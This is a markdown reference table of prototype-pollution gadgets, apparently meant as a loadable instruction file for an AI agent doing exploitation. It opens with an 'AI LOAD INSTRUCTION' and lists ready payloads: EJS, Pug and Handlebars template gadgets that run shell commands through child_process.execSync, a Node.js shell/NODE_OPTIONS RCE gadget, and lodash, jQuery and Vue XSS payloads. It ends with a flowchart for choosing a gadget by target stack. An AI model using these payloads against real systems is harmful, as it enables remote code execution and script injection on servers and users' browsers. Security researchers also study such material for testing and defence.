# Prototype Pollution — Known Gadgets Reference

> **AI LOAD INSTRUCTION**: Comprehensive gadget table for prototype pollution exploitation. Load this when you've confirmed PP and need to find a matching gadget for the target's framework/library. Each entry includes the polluted property, trigger condition, impact (XSS/RCE), and affected versions.

---

## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |

---

## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---

## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---

## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---

## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---

## 6. WEBPACK

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `output.library` | Modified library name | Build process | Code injection in output | Webpack 4.x–5.x |
| `output.auxiliaryComment` | Code injection via comment | Build process | XSS in built files | Webpack 4.x |
| `devtool` | `"eval"` → enables eval mode | Build process | Code execution path | Webpack 4.x–5.x |

Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD attack chains.

---

## 7. FASTIFY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `reply.view` options | Template engine options (same as EJS/Pug gadgets) | `reply.view()` | RCE | Fastify + point-of-view |
| `rewriteUrl` | URL rewrite function | Request routing | Access control bypass | Fastify 3.x |
| `schema` | Modified validation schema | Route validation | Validation bypass | Fastify 3.x–4.x |

---

## 8. NODE.JS CORE

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `shell` | `"node"` or `"/bin/sh"` | `child_process.spawn()` without explicit shell | RCE | All Node.js |
| `NODE_OPTIONS` | `"--require /path/to/evil.js"` | `child_process.fork()` / `.spawn()` | RCE | Node.js 8+ |
| `argv0` | Malicious argument | `child_process.spawn()` | Code injection | All |
| `env` | Custom environment variables | `child_process.spawn()` without explicit env | ENV injection | All |
| `input` | Stdin data | `child_process.execSync()` | Data injection | All |
| `stdio` | Modified stdio config | `child_process.spawn()` | File descriptor manipulation | All |

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
```

---

## 9. MISCELLANEOUS LIBRARIES

### minimist (Argument Parser)

```bash
# CLI argument pollution:
node app.js --__proto__.polluted yes
# Pollutes Object.prototype.polluted = "yes"
```

Affected: minimist < 1.2.6

### yargs

Similar to minimist — CLI argument parsing can pollute prototype.

### qs (Query String Parser)

```
# URL query pollution:
?__proto__[polluted]=yes
?__proto__.polluted=yes
```

qs versions < 6.0.4 allow prototype pollution via nested brackets.

### destr (JSON Parser)

```javascript
destr('{"__proto__":{"polluted":"yes"}}')
// Older versions allow PP through JSON parsing
```

### json5

```javascript
JSON5.parse('{"__proto__":{"polluted":"yes"}}')
// Older versions may pollute prototype
```

---

## 10. GADGET SELECTION FLOWCHART

```
Identified target stack?
│
├── Server-side Node.js
│   ├── Express + template engine?
│   │   ├── EJS → outputFunctionName (highest success rate)
│   │   ├── Pug → block.type + block.val
│   │   ├── Handlebars → allowProtoMethodsByDefault + template chain
│   │   ├── Nunjucks → type: Code
│   │   └── Unknown → try EJS gadget first (most common)
│   │
│   ├── Fastify + point-of-view?
│   │   └── Same template gadgets apply via reply.view
│   │
│   ├── child_process used? (likely yes in any Node.js app)
│   │   └── shell + NODE_OPTIONS → universal Node.js RCE
│   │
│   └── No template / no child_process?
│       └── Try status/header pollution for impact demonstration
│
├── Client-side JavaScript
│   ├── jQuery?
│   │   └── $.extend(true,...) sink + innerHTML/src gadget
│   │
│   ├── Lodash?
│   │   └── _.merge/defaultsDeep sink + _.template sourceURL gadget
│   │
│   ├── Angular 1.x?
│   │   └── $interpolate + sandbox bypass
│   │
│   ├── Vue 2.x?
│   │   └── template property pollution
│   │
│   └── None of the above?
│       └── Generic DOM property pollution (src, href, innerHTML)
│
└── Build pipeline (CI/CD)
    └── Webpack output.library / devtool pollution
```
